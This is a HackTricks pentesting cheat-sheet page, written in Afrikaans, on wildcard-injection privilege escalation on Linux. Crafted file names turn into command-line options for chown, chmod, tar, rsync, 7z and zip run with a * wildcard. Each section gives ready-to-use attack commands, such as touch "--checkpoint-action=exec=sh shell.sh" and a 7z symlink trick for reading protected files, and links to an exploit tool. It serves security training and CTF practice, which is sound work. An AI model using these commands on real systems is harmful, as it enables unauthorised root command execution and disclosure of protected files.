{{#include ../../banners/hacktricks-training.md}}

## chown, chmod

Jy kan **aandui watter lêer eienaar en regte jy wil kopieer vir die res van die lêers**
```bash
touch "--reference=/my/own/path/filename"
```
U kan dit benut deur [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(gecombineerde aanval)_\
Meer inligting in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Voer arbitrêre opdragte uit:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
U kan dit benut deur [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar aanval)_\
Meer inligting in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Voer arbitrêre opdragte uit:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
U kan dit benut deur [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_aanval)_\
Meer inligting in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

In **7z** kan jy selfs `--` voor `*` gebruik (let daarop dat `--` beteken dat die volgende invoer nie as parameters behandel kan word nie, so net lêerpaaie in hierdie geval) jy kan 'n arbitrêre fout veroorsaak om 'n lêer te lees, so as 'n opdrag soos die volgende deur root uitgevoer word:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
En jy kan lêers in die gids skep waar dit uitgevoer word, jy kan die lêer `@root.txt` en die lêer `root.txt` skep wat 'n **symlink** na die lêer is wat jy wil lees:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Dan, wanneer **7z** uitgevoer word, sal dit `root.txt` behandel as 'n lêer wat die lys van lêers bevat wat dit moet saamgepers (dit is wat die bestaan van `@root.txt` aandui) en wanneer 7z `root.txt` lees, sal dit `/file/you/want/to/read` lees en **aangesien die inhoud van hierdie lêer nie 'n lys van lêers is nie, sal dit 'n fout gooi** wat die inhoud toon.

_Meer in Write-ups van die boks CTF van HackTheBox._

## Zip

**Voer arbitrêre opdragte uit:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{{#include ../../banners/hacktricks-training.md}}
